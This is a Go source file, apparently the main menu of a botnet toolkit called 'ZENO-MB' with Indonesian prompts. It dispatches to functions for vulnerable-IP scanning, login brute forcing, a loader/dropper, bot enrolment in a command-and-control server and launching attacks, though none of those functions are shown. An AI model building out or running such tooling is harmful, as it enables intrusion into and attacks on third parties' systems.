package main

import (
    "bufio"
    "fmt"
    "os"
    "os/exec"
    "strings"
)

func clearScreen() {
    cmd := exec.Command("clear")
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func waitForEnter() {
    fmt.Print("\n[ENTER] untuk kembali ke menu...")
    bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func banner() string {
    return `
╔═══════════════════════════════════════════════╗
║        🔥 ZENO-MB: MASTER CONTROL HUB 🔥      ║
║          HDN Cyber Forces | by RIFQI          ║
╠═══════════════════════════════════════════════╣
║ [1] vulnerable iP scanner 🌐                  ║
║ [2] Brute Forcer Login 🔓                     ║
║ [3] Loader Dropper Bot 📦                     ║
║ [4] bot join c2 🤖                            ║
║ [5] monitor & control c2 panel 🧠             ║
║ [6] Launch Attack  🔥                         ║
║ [0] Exit  ❌                                  ║
╚═══════════════════════════════════════════════╝
`
}

func main() {
    reader := bufio.NewReader(os.Stdin)

    for {
        clearScreen()
        fmt.Print(banner())
        fmt.Print("\nPilih menu: ")

        choice, _ := reader.ReadString('\n')
        choice = strings.TrimSpace(choice)

        switch choice {
        case "1":
            RunScanner()
            waitForEnter()
        case "2":
            RunBrute()
            waitForEnter()
        case "3":
            RunLoader()
            waitForEnter()
        case "4":
            RunBotJoin()
            waitForEnter()
        case "5":
            RunC2Panel()
            waitForEnter()
        case "6":
            RunAttack()
            waitForEnter()
        case "0":
            fmt.Println("\nKeluar dari ZENO-MB... Sampai jumpa.")
            return
        default:
            fmt.Println("[!] Pilihan tidak valid!")
            waitForEnter()
        }
    }
}
